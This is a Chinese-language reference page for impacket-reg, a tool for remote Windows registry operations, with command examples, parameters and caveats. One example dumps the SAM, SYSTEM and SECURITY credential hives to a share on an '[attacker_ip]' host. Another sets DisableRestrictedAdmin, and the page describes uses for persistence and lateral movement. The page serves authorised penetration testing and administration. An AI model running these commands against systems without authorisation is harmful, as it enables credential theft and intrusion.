# TAGLINE

远程 Windows 注册表操作工具

# TLDR

**查询注册表键**并列出其子键和值

```impacket-reg '[domain]/[user]:[password]@[target]' query -keyName 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion'```

**递归查询**注册表路径下的所有子键

```impacket-reg '[domain]/[user]:[password]@[target]' query -keyName 'HKLM\SYSTEM\CurrentControlSet' -s```

**按名称查询特定值**

```impacket-reg '[domain]/[user]:[password]@[target]' query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -v ProductName```

**添加注册表值**

```impacket-reg '[domain]/[user]:[password]@[target]' add -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa' -v DisableRestrictedAdmin -vt REG_DWORD -vd 0```

**删除注册表值**

```impacket-reg '[domain]/[user]:[password]@[target]' delete -keyName 'HKLM\SOFTWARE\TestKey' -v TestValue```

**备份 SAM、SYSTEM 和 SECURITY 配置单元**

```impacket-reg '[domain]/[user]:[password]@[target]' backup -o '\\[attacker_ip]\[share]'```

# SYNOPSIS

**impacket-reg** [_-debug_] [_-ts_] [_-hashes LMHASH:NTHASH_] [_-k_] [_-no-pass_] [_-aesKey KEY_] [_-dc-ip IP_] [_-target-ip IP_] [_-port PORT_] _target_ {**query**|**add**|**delete**|**save**|**backup**}

# PARAMETERS

**-debug**
> 开启 DEBUG 输出。

**-ts**
> 为每条日志输出添加时间戳。

**-hashes** _LMHASH:NTHASH_
> 使用 NTLM 哈希进行身份验证。

**-no-pass**
> 不询问密码。

**-k**
> 使用 ccache 文件（KRB5CCNAME）中的 Kerberos 身份验证。

**-aesKey** _KEY_
> 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）。

**-dc-ip** _IP_
> 域控制器的 IP 地址。

**-target-ip** _IP_
> 目标机器的 IP 地址。

**-port** _PORT_
> 目标端口（139 或 445，默认 445）。

# QUERY OPTIONS

**-keyName** _KEYNAME_
> 包含根键的完整注册表路径（HKLM、HKU、HKCU、HKCR）。

**-v** _VALUENAME_
> 查询特定的注册表值名称。

**-ve**
> 查询默认（空）值名。

**-s**
> 递归查询所有子键和值。

# ADD OPTIONS

**-keyName** _KEYNAME_
> 新键或新值的完整注册表路径。

**-v** _VALUENAME_
> 要设置的值名。

**-vt** _VALUETYPE_
> 注册表类型（REG_SZ、REG_DWORD、REG_BINARY、REG_EXPAND_SZ、REG_MULTI_SZ、REG_QWORD 等）。

**-vd** _VALUEDATA_
> 要设置的数据。REG_MULTI_SZ 类型可多次使用。

# DELETE OPTIONS

**-keyName** _KEYNAME_
> 要从中删除的完整注册表路径。

**-v** _VALUENAME_
> 要删除的特定值。

**-va**
> 删除该键下的所有值。

**-ve**
> 删除默认值。

# DESCRIPTION

**impacket-reg** 通过 MS-RRP MSRPC 接口提供远程 Windows 注册表操作功能，相当于 Windows **reg.exe** 的远程版本。它可以查询、添加、删除和保存远程 Windows 机器上的注册表键和值。

如果目标上的 Remote Registry 服务未运行（即使已被禁用），该工具会自动启动它，并在完成后恢复原始状态。因此即使面对已手动禁用该服务的加固主机，它也能生效。

# CAVEATS

需要对目标具有管理员凭据。有效的根键为 **HKLM**、**HKU**、**HKCU** 和 **HKCR**。修改关键注册表键（例如 SYSTEM 或 Security 下）可能导致目标无法启动。backup 命令写入 UNC 路径，因此攻击者必须拥有可从目标访问的可写 SMB 共享。

# HISTORY

属于 **SecureAuth**（现为 **Fortra**）的 **Impacket** 库。该工具基于 MSRPC 实现 MS-RRP（Windows 远程注册表协议）规范，支持渗透测试中常见的用于持久化、横向移动和凭据提取的远程注册表操作。

# INSTALL

```pacman: sudo pacman -S impacket```

<!-- packages: 2026-07-22 -->

# SEE ALSO

[impacket-secretsdump](/man/impacket-secretsdump)(1), [impacket-psexec](/man/impacket-psexec)(1), [impacket-smbclient](/man/impacket-smbclient)(1)
